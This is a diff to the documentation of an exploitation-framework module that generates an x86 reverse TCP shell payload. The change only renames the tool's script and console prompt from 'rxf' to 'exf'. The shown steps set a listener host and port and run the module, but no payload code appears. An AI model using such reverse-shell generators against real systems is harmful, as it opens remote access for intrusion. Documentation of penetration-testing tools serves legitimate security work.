@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell for X86 arch
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/x86/reverse_tcp`
   3. Do: `set lhost 192.168.1.4`
   4. Do: `set lport 4321`
@@ -13,12 +13,12 @@ Module generates payload that creates interactive tcp reverse shell for X86 arch
 ## Scenarios
 
 ```
-rxf > use payloads/x86/reverse_tcp
-rxf (X86 Reverse TCP) > set lhost 192.168.1.4
+exf > use payloads/x86/reverse_tcp
+exf (X86 Reverse TCP) > set lhost 192.168.1.4
 [+] lhost => 192.168.1.4
-rxf (X86 Reverse TCP) > set lport 4321
+exf (X86 Reverse TCP) > set lport 4321
 [+] lport => 4321
-rxf (X86 Reverse TCP) > run
+exf (X86 Reverse TCP) > run
 [*] Running module...
 [*] Generating payload
 [+] Building payload for python
